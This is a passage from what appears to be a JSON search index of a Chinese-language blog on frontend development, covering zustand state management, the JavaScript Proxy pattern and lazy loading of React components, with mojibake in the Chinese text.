createStore = () =\u0026gt; create(...)\rconst App = () =\u0026gt; (\r\u0026lt;Provider createStore={createStore}\u0026gt;\r...\r\u0026lt;/Provider\u0026gt;\r)\rconst Component = () =\u0026gt; {\rconst state = useStore()\rconst slice = useStore(selector)\r...\r} 2. åœ¨ç»„ä»¶ä¸­ä½¿ç”¨ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48  import create from \u0026#34;zustand\u0026#34;; import createContext from \u0026#34;zustand/context\u0026#34;; // æœ€ä½³å®è·µï¼šå¯ä»¥å°†ä¸‹é¢çš„ createContext() å’Œ createStore ç§»åŠ¨åˆ°å•ç‹¬çš„æ–‡ä»¶ (store.js) å¹¶å¯¼å…¥æä¾›ç¨‹åºProviderï¼Œåœ¨æ­¤å¤„/ä»»ä½•éœ€è¦çš„åœ°æ–¹ä½¿ç”¨ storeã€‚  const { Provider, useStore } = createContext(); const createStore = () =\u0026gt; create((set) =\u0026gt; ({ bears: 0, increasePopulation: () =\u0026gt; set((state) =\u0026gt; ({ bears: state.bears + 1 })), removeAllBears: () =\u0026gt; set({ bears: 0 }) })); const Button = () =\u0026gt; { return ( {/** store() - æ¯æ¬¡ä½¿ç”¨ Button ç»„ä»¶éƒ½åˆ›å»ºä¸€ä¸ª storeï¼Œè€Œä¸æ˜¯ä¸ºæ‰€æœ‰ç»„ä»¶ä½¿ç”¨ä¸€ä¸ª store **/} \u0026lt;Provider createStore={createStore}\u0026gt; \u0026lt;ButtonChild /\u0026gt; \u0026lt;/Provider\u0026gt; ); }; const ButtonChild = () =\u0026gt; { const state = useStore(); return ( \u0026lt;div\u0026gt; {state.bears} \u0026lt;button onClick={() =\u0026gt; { state.increasePopulation(); }} \u0026gt; + \u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; ); }; export default function App() { return ( \u0026lt;div className=\u0026#34;App\u0026#34;\u0026gt; \u0026lt;Button /\u0026gt; \u0026lt;Button /\u0026gt; \u0026lt;/div\u0026gt; ); }   3. createContext ä½¿ç”¨ props åˆå§‹åŒ–ï¼ˆåœ¨ TS ä¸­ï¼‰ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  import create from \u0026#34;zustand\u0026#34;; import createContext from \u0026#34;zustand/context\u0026#34;; type BearState = { bears: number increase: () =\u0026gt; void } // å°†ç±»å‹ä¼ é€’ç»™ `createContext` è€Œä¸æ˜¯ `create` const { Provider, useStore } = createContext\u0026lt;BearState\u0026gt;(); export default function App({ initialBears }: { initialBears: number }) { return ( \u0026lt;Provider createStore={() =\u0026gt; create((set) =\u0026gt; ({ bears: initialBears, increase: () =\u0026gt; set((state) =\u0026gt; ({ bears: state.bears + 1 })), })) } \u0026gt; \u0026lt;Button /\u0026gt; \u0026lt;/Provider\u0026gt; ) }   åä¸ƒã€TypeScript ç±»å‹å®šä¹‰ 1. ç±»å‹å®šä¹‰ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  // å¯ä»¥ä½¿ç”¨ `type` type BearState = { bears: number increase: (by: number) =\u0026gt; void } // æˆ–è€… `interface` interface BearState { bears: number increase: (by: number) =\u0026gt; void } // å®ƒå¯¹ä¸¤è€…éƒ½æœ‰æ•ˆ const useStore = create\u0026lt;BearState\u0026gt;(set =\u0026gt; ({ bears: 0, increase: (by) =\u0026gt; set(state =\u0026gt; ({ bears: state.bears + by })), }))   2. ä½¿ç”¨combine å¹¶è®© tsc æ¨æ–­ç±»å‹ è¿™å°†ä¸¤ä¸ªçŠ¶æ€æµ…åˆå¹¶ã€‚\nimport { combine } from \u0026#39;zustand/middleware\u0026#39;\rconst useStore = create(\rcombine(\r{ bears: 0 },\r(set) =\u0026gt; ({ increase: (by: number) =\u0026gt; set((state) =\u0026gt; ({ bears: state.bears + by })) })\r),\r) åå…«ã€æœ€ä½³å®è·µï¼ˆå°†storeæ‹†åˆ†ä¸ºå•ç‹¬çš„sliceï¼‰  ç›®å½•ç»“æ„\n  1.store/createBearSlice.js\n const createBearSlice = (set, get) =\u0026gt; ({\reatFish: () =\u0026gt; {\rset((prev) =\u0026gt; ({ fishes: prev.fishes \u0026gt; 1 ? prev.fishes - 1 : 0 }));\r}\r});\rexport default createBearSlice;  2.store/createFishSlice.js\n const maxFishes = 10;\rconst createFishSlice = (set, get) =\u0026gt; ({\rfishes: maxFishes,\rrepopulate: () =\u0026gt; {\rset((prev) =\u0026gt; ({ fishes: maxFishes }));\r}\r});\rexport default createFishSlice;  3.store/createHoneySlice.js\n const createHoneySlice = (set, get) =\u0026gt; ({\rhoneySlice: {\rhoney: 4\r}\r});\rexport default createHoneySlice;  4.store/useStore.js\n import create from \u0026#34;zustand\u0026#34;;\rimport createBearSlice from \u0026#34;./createBearSlice\u0026#34;;\rimport createFishSlice from \u0026#34;./createFishSlice\u0026#34;;\rimport createHoneySlice from \u0026#34;./createHoneySlice\u0026#34;;\rconst useStore = create((set, get) =\u0026gt; ({\r...createBearSlice(set, get),\r...createHoneySlice(set, get),\r...createFishSlice(set, get)\r}));\rexport default useStore;  5.pages/Mountain.js\n import useStore from \u0026#34;../store/useStore\u0026#34;;\rexport default function Mountain() {\rconst fishes = useStore((state) =\u0026gt; state.fishes);\rconst eatFish = useStore((state) =\u0026gt; state.eatFish);\rconst repopulate = useStore((state) =\u0026gt; state.repopulate);\rconst honey = useStore((state) =\u0026gt; state.honeySlice.honey);\rreturn (\r\u0026lt;div className=\u0026#34;Mountain\u0026#34;\u0026gt;\r\u0026lt;p\u0026gt;Fishes : {fishes}\u0026lt;/p\u0026gt;\r\u0026lt;p\u0026gt;honey : {honey}\u0026lt;/p\u0026gt;\r\u0026lt;p\u0026gt;\r\u0026lt;button onClick={eatFish}\u0026gt;Eat\u0026lt;/button\u0026gt;\r\u0026lt;/p\u0026gt;\r\u0026lt;p\u0026gt;\r\u0026lt;button onClick={repopulate}\u0026gt;Repopulate\u0026lt;/button\u0026gt;\r\u0026lt;/p\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r} ","description":"ä½¿ç”¨ç®€åŒ–çš„é€šé‡åŸç†çš„å°å‹ã€å¿«é€Ÿä¸”å¯æ‰©å±•çš„ReactçŠ¶æ€ç®¡ç†è§£å†³æ–¹æ¡ˆã€‚æœ‰ä¸€ä¸ªåŸºäºé’©å­çš„èˆ’é€‚ apiã€‚è¿™æ˜¯æˆ‘æ„Ÿè§‰æœ€å¥½çš„Reactçš„çŠ¶æ€ç®¡ç†åº“ï¼Œå¾ˆå¯çˆ±ã€‚","id":65,"section":"react","tags":null,"title":"zustand","uri":"https://codthing.github.io/react/zustand/zustand-base/"},{"content":"ä½¿ç”¨ Proxy å¯¹è±¡ï¼Œå¯ä»¥æ›´å¥½åœ°æ§åˆ¶ä¸æŸäº›å¯¹è±¡çš„äº¤äº’ã€‚ æ¯å½“ä¸å¯¹è±¡äº¤äº’æ—¶ï¼Œä»£ç†å¯¹è±¡éƒ½å¯ä»¥ç¡®å®šè¡Œä¸ºï¼Œä¾‹å¦‚å½“æˆ‘ä»¬è·å–ä¸€ä¸ªå€¼æˆ–è®¾ç½®ä¸€ä¸ªå€¼æ—¶ã€‚\nä¸€èˆ¬æ¥è¯´ï¼Œä»£ç†æ˜¯æŒ‡åˆ«äººçš„æ›¿èº«ã€‚ æ‚¨å°†ä¸è”ç³»çš„äººçš„ä»£ç†äººäº¤è°ˆï¼Œè€Œä¸æ˜¯ç›´æ¥ä¸è¯¥äººäº¤è°ˆã€‚ JavaScript ä¸­ä¹Ÿä¼šå‘ç”ŸåŒæ ·çš„æƒ…å†µï¼šæˆ‘ä»¬å°†ä¸ Proxy å¯¹è±¡äº¤äº’ï¼Œè€Œä¸æ˜¯ç›´æ¥ä¸ç›®æ ‡å¯¹è±¡äº¤äº’ã€‚\n\rProxy ä»£ç† åˆ›å»ºä¸€ä¸ªä»£è¡¨ John Doe çš„ person å¯¹è±¡ã€‚\nconst person = {\rname: \u0026#34;John Doe\u0026#34;,\rage: 42,\rnationality: \u0026#34;American\u0026#34;\r}; æˆ‘ä»¬å¸Œæœ›ä¸ä»£ç†å¯¹è±¡è¿›è¡Œäº¤äº’ï¼Œè€Œä¸æ˜¯ç›´æ¥ä¸è¯¥å¯¹è±¡äº¤äº’ã€‚ åœ¨ JavaScript ä¸­ï¼Œå¯ä»¥é€šè¿‡åˆ›å»ºä¸€ä¸ªæ–°çš„ Proxy å®ä¾‹æ¥è½»æ¾åœ°åˆ›å»ºä¸€ä¸ªæ–°çš„ä»£ç†ã€‚\nconst person = {\rname: \u0026#34;John Doe\u0026#34;,\rage: 42,\rnationality: \u0026#34;American\u0026#34;\r};\rconst personProxy = new Proxy(person, {}); Proxy çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ä¸€ä¸ªä»£è¡¨å¤„ç†ç¨‹åºçš„å¯¹è±¡ã€‚ åœ¨å¤„ç†ç¨‹åºå¯¹è±¡ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥æ ¹æ®äº¤äº’çš„ç±»å‹å®šä¹‰ç‰¹å®šçš„è¡Œä¸ºã€‚ è™½ç„¶æœ‰å¾ˆå¤šæ–¹æ³•å¯ä»¥æ·»åŠ åˆ°ä»£ç†å¤„ç†ç¨‹åºä¸­ï¼Œä½†æœ€å¸¸è§çš„ä¸¤ä¸ªæ˜¯ get å’Œ setï¼š\n getï¼šåœ¨å°è¯•è®¿é—®å±æ€§æ—¶è¢«è°ƒç”¨ setï¼šåœ¨å°è¯•ä¿®æ”¹å±æ€§æ—¶è¢«è°ƒç”¨  å®é™…ä¸Šï¼Œæœ€ç»ˆä¼šå‘ç”Ÿä»¥ä¸‹æƒ…å†µï¼š\næˆ‘ä»¬å°†ä¸ personProxy è¿›è¡Œäº¤äº’ï¼Œè€Œä¸æ˜¯ç›´æ¥ä¸ person å¯¹è±¡äº¤äº’ã€‚\nè®©æˆ‘ä»¬å‘ personProxy ä»£ç†æ·»åŠ å¤„ç†ç¨‹åºã€‚ å½“å°è¯•ä¿®æ”¹ä¸€ä¸ªå±æ€§ï¼Œä»è€Œè°ƒç”¨ä»£ç†ä¸Šçš„ set æ–¹æ³•æ—¶ï¼Œæˆ‘ä»¬å¸Œæœ›ä»£ç†è®°å½•è¯¥å±æ€§çš„å…ˆå‰å€¼å’Œæ–°å€¼ã€‚ å½“è¯•å›¾è®¿é—®ä¸€ä¸ªå±æ€§ï¼Œä»è€Œè°ƒç”¨ä»£ç†ä¸Šçš„ get æ–¹æ³•æ—¶ï¼Œæˆ‘ä»¬å¸Œæœ›ä»£ç†è®°å½•ä¸€ä¸ªæ›´æ˜“è¯»çš„å¥å­ï¼Œå…¶ä¸­åŒ…å«è¯¥å±æ€§çš„ä»»ä½•å€¼ã€‚\n1 2 3 4 5 6 7 8 9 10  const personProxy = new Proxy(person, { get: (obj, prop) =\u0026gt; { console.log(`${prop}çš„å€¼æ˜¯ ${obj[prop]}`); }, set: (obj, prop, value) =\u0026gt; { console.log(`å°† ${prop}ä» ${obj[prop]}æ›´æ”¹ä¸º ${value}`); obj[prop] = value; } });   Perfect! è®©æˆ‘ä»¬çœ‹çœ‹å½“æˆ‘ä»¬å°è¯•ä¿®æ”¹æˆ–æ£€ç´¢å±æ€§æ—¶ä¼šå‘ç”Ÿä»€ä¹ˆã€‚\n1 2 3  personProxy.name; //name çš„å€¼æ˜¯ John Doe personProxy.age = 43; //å¹´é¾„ä» 42 æ›´æ”¹ä¸º 43   åœ¨è®¿é—® name å±æ€§æ—¶ï¼ŒProxy è¿”å›äº†ä¸€ä¸ªæ›´å¥½å¬çš„å¥å­ï¼šname çš„å€¼æ˜¯ John Doeã€‚\nåœ¨ä¿®æ”¹ age å±æ€§æ—¶ï¼ŒProxy è¿”å›äº†è¯¥å±æ€§çš„ä¸Šä¸€ä¸ªå€¼å’Œæ–°å€¼ï¼šå°†å¹´é¾„ä» 42 æ›´æ”¹ä¸º 43ã€‚\n\r\rä»£ç†å¯ç”¨äºæ·»åŠ éªŒè¯ã€‚ ç”¨æˆ·ä¸åº”è¯¥èƒ½å¤Ÿå°†äººçš„å¹´é¾„æ›´æ”¹ä¸ºå­—ç¬¦ä¸²å€¼ï¼Œæˆ–è€…ç»™ä»–ä¸€ä¸ªç©ºçš„åå­—ã€‚ æˆ–è€…ï¼Œå¦‚æœç”¨æˆ·è¯•å›¾è®¿é—®å¯¹è±¡ä¸Šä¸å­˜åœ¨çš„å±æ€§ï¼Œæˆ‘ä»¬åº”è¯¥è®©ç”¨æˆ·çŸ¥é“ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  const personProxy = new Proxy(person, { get: (obj, prop) =\u0026gt; { if (!obj[prop]) { console.log( `å—¯..ç›®æ ‡å¯¹è±¡ä¸Šä¼¼ä¹ä¸å­˜åœ¨æ­¤å±æ€§` ); } else { console.log(`${prop}çš„å€¼æ˜¯ ${obj[prop]}`); } }, set: (obj, prop, value) =\u0026gt; { if (prop === \u0026#34;age\u0026#34; \u0026amp;\u0026amp; typeof value !== \u0026#34;number\u0026#34;) { console.log(`æŠ±æ­‰ï¼Œæ‚¨åªèƒ½ä¼ é€’å¹´é¾„çš„æ•°å€¼ã€‚`); } else if (prop === \u0026#34;name\u0026#34; \u0026amp;\u0026amp; value.length \u0026lt; 2) { console.log(`æ‚¨éœ€è¦æä¾›ä¸€ä¸ªæœ‰æ•ˆçš„ nameã€‚`); } else { console.log(`å°† ${prop}ä» ${obj[prop]}æ›´æ”¹ä¸º ${value}ã€‚`); obj[prop] = value; } } });   è®©æˆ‘ä»¬çœ‹çœ‹å½“æˆ‘ä»¬è¯•å›¾ä¼ é€’é”™è¯¯å€¼æ—¶ä¼šå‘ç”Ÿä»€ä¹ˆï¼\n1 2 3 4  personProxy.nonExistentProperty; //å—¯..è¿™ä¸ªå±æ€§ä¼¼ä¹ä¸å­˜åœ¨ personProxy.age = \u0026#34;44\u0026#34;; //æŠ±æ­‰ï¼Œæ‚¨åªèƒ½ä¼ é€’å¹´é¾„çš„æ•°å€¼ personProxy.name = \u0026#34;\u0026#34;; //æ‚¨éœ€è¦æä¾›ä¸€ä¸ªæœ‰æ•ˆçš„åç§°   Proxy ä»£ç†ç¡®ä¿æˆ‘ä»¬æ²¡æœ‰ä¿®æ”¹å…·æœ‰é”™è¯¯å€¼çš„ person å¯¹è±¡ï¼Œè¿™æœ‰åŠ©äºæˆ‘ä»¬ä¿æŒæ•°æ®çº¯å‡€ï¼\n\rReflect æ˜ å°„ JavaScript æä¾›äº†ä¸€ä¸ªåä¸º çš„å†…ç½®å¯¹è±¡Reflectï¼Œå®ƒä½¿æˆ‘ä»¬åœ¨ä½¿ç”¨ä»£ç†æ—¶æ›´å®¹æ˜“æ“ä½œç›®æ ‡å¯¹è±¡ã€‚\nReflect æ˜¯ä¸€ä¸ªå†…ç½®çš„å¯¹è±¡ï¼Œå®ƒæä¾›æ‹¦æˆª JavaScript æ“ä½œçš„æ–¹æ³•ã€‚\nè¿™äº›æ–¹æ³•ä¸ proxy handlers çš„æ–¹æ³•ç›¸åŒã€‚\nReflect ä¸æ˜¯ä¸€ä¸ªå‡½æ•°å¯¹è±¡ï¼Œå› æ­¤å®ƒæ˜¯ä¸å¯æ„é€ çš„ã€‚\nåœ¨ä¸Šé¢ï¼Œæˆ‘ä»¬å°è¯•é€šè¿‡ä½¿ç”¨æ‹¬å·è¡¨ç¤ºæ³•ç›´æ¥è·å–æˆ–è®¾ç½®å€¼æ¥ä¿®æ”¹å’Œè®¿é—®ä»£ç†å†…ç›®æ ‡å¯¹è±¡çš„å±æ€§ã€‚ ç°åœ¨ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ Reflect å¯¹è±¡ã€‚ Reflect å¯¹è±¡ä¸Šçš„æ–¹æ³•ä¸å¤„ç†ç¨‹åºå¯¹è±¡ä¸Šçš„æ–¹æ³•åŒåã€‚\nå¯ä»¥é€šè¿‡ Reflect.get() å’Œ Reflect.set() è®¿é—®æˆ–ä¿®æ”¹ç›®æ ‡å¯¹è±¡ä¸Šçš„å±æ€§ï¼Œè€Œä¸æ˜¯é€šè¿‡ obj[prop] è®¿é—®å±æ€§æˆ–é€šè¿‡ obj[prop] = value è®¾ç½®å±æ€§ã€‚ è¿™äº›æ–¹æ³•æ¥æ”¶ä¸å¤„ç†ç¨‹åºï¼ˆhandlersï¼‰å¯¹è±¡ä¸Šçš„æ–¹æ³•ç›¸åŒçš„å‚æ•°ã€‚\n1 2 3 4 5 6 7 8 9 10  const personProxy = new Proxy(person, { get: (obj, prop) =\u0026gt; { console.log(`${prop}çš„å€¼æ˜¯ ${Reflect.get(obj, prop)}`); }, set: (obj, prop, value) =\u0026gt; { console.log(`å°† ${prop}ä» ${obj[prop]}æ›´æ”¹ä¸º ${value}`); Reflect.set(obj, prop, value); } });   Perfect! æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ Reflect å¯¹è±¡è½»æ¾è®¿é—®å’Œä¿®æ”¹ç›®æ ‡å¯¹è±¡çš„å±æ€§ã€‚\n1 2 3 4  personProxy.name; //name çš„å€¼æ˜¯ John Doe personProxy.age = 43; //å¹´é¾„ä» 42 æ›´æ”¹ä¸º 43 personProxy.name = \u0026#34;Jane Doe\u0026#34;; //å°†åå­—ä» John Doe æ›´æ”¹ä¸º Jane Doe   \rä¼˜ç¼ºç‚¹ Proxy æ˜¯ä¸€ç§å¼ºå¤§çš„æ–¹å¼æ¥æ·»åŠ å¯¹å¯¹è±¡è¡Œä¸ºçš„æ§åˆ¶ã€‚ ä»£ç†å¯ä»¥æœ‰å„ç§ç”¨ä¾‹ï¼šå®ƒå¯ä»¥å¸®åŠ©éªŒè¯ã€æ ¼å¼åŒ–ã€é€šçŸ¥æˆ–è°ƒè¯•ã€‚\nè¿‡åº¦ä½¿ç”¨ Proxy å¯¹è±¡æˆ–å¯¹æ¯ä¸ªå¤„ç†ç¨‹åºæ–¹æ³•è°ƒç”¨æ‰§è¡Œç¹é‡çš„æ“ä½œå¾ˆå®¹æ˜“å¯¹åº”ç”¨ç¨‹åºçš„æ€§èƒ½äº§ç”Ÿè´Ÿé¢å½±å“ã€‚\næœ€å¥½ä¸è¦å¯¹æ€§èƒ½å…³é”®ä»£ç ä½¿ç”¨ Proxyã€‚\n\rçŸ¥è¯†ç‚¹  Proxy Reflect  ","description":"æ‹¦æˆªå’Œæ§åˆ¶ä¸ç›®æ ‡å¯¹è±¡çš„äº¤äº’","id":66,"section":"react-patterns","tags":null,"title":"ä»£ç†æ¨¡å¼","uri":"https://codthing.github.io/react-patterns/design-patterns/proxy-patterns/"},{"content":"åœ¨èŠå¤©åº”ç”¨ç¨‹åºä¸­ï¼Œæœ‰å››ä¸ªä¸»è¦éƒ¨åˆ†ï¼šUserInfoï¼ŒChatListï¼ŒChatInputå’ŒEmojiPickerã€‚\nä½†æ˜¯ï¼Œåœ¨åˆå§‹é¡µé¢åŠ è½½æ—¶ï¼Œåªæœ‰ä¸‰ä¸ªç»„ä»¶ä¼šç«‹å³ä½¿ç”¨ï¼šUserInfoã€ChatListå’ŒChatInputã€‚\nEmojiPickerä¸æ˜¯ç›´æ¥å¯è§çš„ï¼Œç”¨æˆ·ç”šè‡³ä¸ä¼šç‚¹å‡» EmojiPickerã€‚\nè¿™æ„å‘³ç€ä¸å¿…å°† EmojiPicker æ¨¡å—æ·»åŠ åˆ°åˆå§‹åŒ…ä¸­ï¼Œå¦åˆ™å¯èƒ½ä¼šå¢åŠ åŠ è½½æ—¶é—´ï¼\nä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œå¯ä»¥åŠ¨æ€å¯¼å…¥çš„ EmojiPicker ç»„ä»¶ã€‚\n\rReact Suspense åœ¨ React ä¸­åŠ¨æ€å¯¼å…¥ç»„ä»¶çš„ä¸€ç§ç®€å•æ–¹æ³•æ˜¯ä½¿ç”¨ React Suspenseã€‚\nReact.Suspense ç»„ä»¶æ¥æ”¶åº”åŠ¨æ€åŠ è½½çš„éƒ¨ä»¶ï¼Œè¿™ä½¿å¾—å®ƒå¯ä»¥ä½¿ App ç»„ä»¶å¯ä»¥é€šè¿‡æš‚åœè¿›å£æ›´å¿«çš„æ¸²æŸ“å®ƒçš„å†…å®¹ EmojiPicker æ¨¡å—ï¼\nå½“ç”¨æˆ·å•å‡»è¡¨æƒ…ç¬¦å·æ—¶ï¼ŒEmojiPicker ç»„ä»¶å°†é¦–æ¬¡å‘ˆç°ã€‚\nEmojiPicker ç»„ä»¶æ¸²æŸ“ä¸€ä¸ª Suspense ç»„ä»¶ï¼Œè¯¥ç»„ä»¶æ¥æ”¶å»¶è¿Ÿå¯¼å…¥çš„æ¨¡å—ï¼šSuspense ç»„ä»¶æ¥å—ä¸€ä¸ª fallback propï¼Œå®ƒæ¥æ”¶åº”è¯¥åœ¨æŒ‚èµ·çš„ç»„ä»¶ä»åœ¨åŠ è½½æ—¶æ¸²æŸ“çš„ç»„ä»¶ï¼\nè€Œä¸æ˜¯ä¸å¿…è¦åœ°æ·»åŠ  EmojiPicker åˆ°åˆå§‹æ†ç»‘åŒ…ï¼Œå¯ä»¥æŠŠå®ƒåˆ†æˆè‡ªå·±çš„åŒ…å¹¶å‡å°åˆå§‹åŒ…çš„å¤§å°ï¼\nè¾ƒå°çš„åˆå§‹åŒ…å¤§å°æ„å‘³ç€æ›´å¿«çš„åˆå§‹åŠ è½½ï¼š\nç”¨æˆ·ä¸å¿…é•¿æ—¶é—´ç›¯ç€ç©ºç™½çš„åŠ è½½å±å¹•ã€‚\nè¯¥ fallback ç»„ä»¶è®©ç”¨æˆ·çŸ¥é“åº”ç”¨ç¨‹åºè¿˜æ²¡æœ‰å†»ç»“ï¼šä»–ä»¬åªéœ€è¦ç­‰å¾…ä¸€æ®µæ—¶é—´æ¥å¤„ç†å’Œæ‰§è¡Œæ¨¡å—ã€‚\n1 2 3 4 5  Asset Size Chunks Chunk Names emoji-picker.bundle.js 1.48 KiB 1 [emitted] emoji-picker main.bundle.js 1.33 MiB main [emitted] main vendors~emoji-picker.bundle.js 171 KiB 2 [emitted] vendors~emoji-picker   ä¹‹å‰çš„åˆå§‹åŒ…æ˜¯ 1.5MiBï¼Œç°åœ¨å·²ç»èƒ½å¤Ÿé€šè¿‡æš‚åœ EmojiPicker çš„å¯¼å…¥å°†å…¶å‡å°‘åˆ° 1.33 MiBï¼\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50  // ä¹‹å‰çš„ components/ChatInput.js import React from \u0026#34;react\u0026#34;; import Send from \u0026#34;./icons/Send\u0026#34;; import Emoji from \u0026#34;./icons/Emoji\u0026#34;; import Picker from \u0026#34;./EmojiPicker\u0026#34;; const ChatInput = () =\u0026gt; { const [pickerOpen, togglePicker] = React.useReducer(state =\u0026gt; !state, false); return ( \u0026lt;div className=\u0026#34;chat-input-container\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; placeholder=\u0026#34;Type a message...\u0026#34; /\u0026gt; \u0026lt;Emoji onClick={togglePicker} /\u0026gt; {pickerOpen \u0026amp;\u0026amp; \u0026lt;Picker /\u0026gt;} \u0026lt;Send /\u0026gt; \u0026lt;/div\u0026gt; ); }; // ç°åœ¨çš„ components/ChatInput.js import React, { Suspense, lazy } from \u0026#34;react\u0026#34;; // import Send from \u0026#34;./icons/Send\u0026#34;; // import Emoji from \u0026#34;./icons/Emoji\u0026#34;; const Send = lazy(() =\u0026gt; import(/*webpackChunkName: \u0026#34;send-icon\u0026#34; */ \u0026#34;./icons/Send\u0026#34;) ); const Emoji = lazy(() =\u0026gt; import(/*webpackChunkName: \u0026#34;emoji-icon\u0026#34; */ \u0026#34;./icons/Emoji\u0026#34;) ); // Lazy load EmojiPicker when \u0026lt;EmojiPicker /\u0026gt; renders const Picker = lazy(() =\u0026gt; import(/*webpackChunkName: \u0026#34;emoji-picker\u0026#34; */ \u0026#34;./EmojiPicker\u0026#34;) ); const ChatInput = () =\u0026gt; { const [pickerOpen, togglePicker] = React.useReducer(state =\u0026gt; !state, false); return ( \u0026lt;Suspense fallback={\u0026lt;p id=\u0026#34;loading\u0026#34;\u0026gt;Loading...\u0026lt;/p\u0026gt;}\u0026gt; \u0026lt;div className=\u0026#34;chat-input-container\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; placeholder=\u0026#34;Type a message...\u0026#34; /\u0026gt; \u0026lt;Emoji onClick={togglePicker} /\u0026gt; {pickerOpen \u0026amp;\u0026amp; \u0026lt;Picker /\u0026gt;} \u0026lt;Send /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/Suspense\u0026gt; ); };   åœ¨æ„å»ºåº”ç”¨ç¨‹åºæ—¶ï¼Œå¯ä»¥çœ‹åˆ° Webpack åˆ›å»ºçš„ä¸åŒåŒ…ã€‚\né€šè¿‡åŠ¨æ€å¯¼å…¥ EmojiPicker ç»„ä»¶ï¼Œè®¾æ³•å°†åˆå§‹åŒ…å¤§å°ä» 1.5MiB å‡å°‘åˆ° 1.33 MiBï¼\nå°½ç®¡ç”¨æˆ·å¯èƒ½ä»ç„¶éœ€è¦ç­‰å¾…ä¸€æ®µæ—¶é—´æ‰èƒ½å®Œå…¨åŠ è½½ EmojiPickerï¼Œä½†é€šè¿‡ç¡®ä¿åœ¨ç”¨æˆ·ç­‰å¾…ç»„ä»¶åŠ è½½æ—¶å‘ˆç°åº”ç”¨ç¨‹åºå’Œäº¤äº’æ¥æ”¹å–„ç”¨æˆ·ä½“éªŒã€‚\n\rloadable-components âœ” æœåŠ¡å™¨ç«¯æ¸²æŸ“ä¸æ”¯æŒ React Suspenseï¼ˆç›®å‰ï¼‰ã€‚\nReact Suspense çš„ä¸€ä¸ªå¾ˆå¥½çš„æ›¿ä»£å“æ˜¯ loadable-components åº“ï¼Œå®ƒå¯ä»¥åœ¨ SSR åº”ç”¨ç¨‹åºä¸­ä½¿ç”¨ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  // components/ChatInput.js import React from \u0026#34;react\u0026#34;; import loadable from \u0026#34;@loadable/component\u0026#34;; import Send from \u0026#34;./icons/Send\u0026#34;; import Emoji from \u0026#34;./icons/Emoji\u0026#34;; const EmojiPicker = loadable(() =\u0026gt; import(\u0026#34;./EmojiPicker\u0026#34;), { fallback: \u0026lt;div id=\u0026#34;loading\u0026#34;\u0026gt;Loading...\u0026lt;/div\u0026gt; }); const ChatInput = () =\u0026gt; { const [pickerOpen, togglePicker] = React.useReducer(state =\u0026gt; !state, false); return ( \u0026lt;div className=\u0026#34;chat-input-container\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; placeholder=\u0026#34;Type a message...\u0026#34; /\u0026gt; \u0026lt;Emoji onClick={togglePicker} /\u0026gt; {pickerOpen \u0026amp;\u0026amp; \u0026lt;EmojiPicker /\u0026gt;} \u0026lt;Send /\u0026gt; \u0026lt;/div\u0026gt; ); }; export default ChatInput;   ä¸ React Suspense ç±»ä¼¼ï¼Œ\nå¯ä»¥å°†å»¶è¿Ÿå¯¼å…¥çš„æ¨¡å—ä¼ é€’ç»™ loadableï¼Œå®ƒåªä¼šåœ¨è¯·æ±‚ EmojiPicker æ¨¡å—æ—¶æ‰å¯¼å…¥è¯¥æ¨¡å—ï¼\nåœ¨åŠ è½½æ¨¡å—æ—¶ï¼Œå¯ä»¥æ¸²æŸ“å›é€€ç»„ä»¶ã€‚\nå°½ç®¡å¯åŠ è½½ç»„ä»¶æ˜¯ç”¨äº SSR åº”ç”¨ç¨‹åºçš„ React Suspense çš„ç»ä½³æ›¿ä»£å“ï¼Œå®ƒåœ¨ CSR åº”ç”¨ç¨‹åºä¸­ä¹Ÿå¾ˆæœ‰ç”¨ï¼Œç”¨ä»¥æš‚åœæ¨¡å—çš„å¯¼å…¥ã€‚\n\rçŸ¥è¯†ç‚¹   React.Suspense\n  fallback prop\n  loadable-components\n  ","description":"æŒ‰éœ€å¯¼å…¥éƒ¨åˆ†ä»£ç ","id":67,"section":"react-patterns","tags":null,"title":"åŠ¨æ€å¯¼å…¥","uri":"https://codthing.github.io/react-patterns/performance-patterns/dynamic-import/"},{"content":"å¯è®¿é—®æ€§æ˜¯ä½¿ç½‘ç«™åŒ…å®¹æ‰€æœ‰äººçš„åšæ³•ã€‚\nè¿™æ„å‘³ç€æ”¯æŒä¾‹å¦‚ï¼šé”®ç›˜å¯¼èˆªã€å±å¹•é˜…è¯»å™¨æ”¯æŒã€è§¦æ‘¸å‹å¥½ã€å¯ç”¨çš„é¢œè‰²å¯¹æ¯”åº¦ã€å‡å°‘è¿åŠ¨å’Œç¼©æ”¾æ”¯æŒã€‚\nå¯è®¿é—®æ€§æµ‹è¯•æ ¹æ®ä¸€ç»„åŸºäº WCAG è§„åˆ™å’Œå…¶ä»–è¡Œä¸šå…¬è®¤çš„æœ€ä½³å®è·µçš„å¯å‘å¼æ–¹æ³•æ¥å®¡æ ¸å‘ˆç°çš„ DOMã€‚ å®ƒä»¬å……å½“ QA çš„ç¬¬ä¸€é“é˜²çº¿ï¼Œä»¥å‘ç°æ˜æ˜¾çš„å¯è®¿é—®æ€§è¿è§„è¡Œä¸ºã€‚\nStorybook çš„å®˜æ–¹ a11y æ’ä»¶ ä¼šåœ¨å¼€å‘ç»„ä»¶æ—¶è¿è¡Œå¯è®¿é—®æ€§å®¡æ 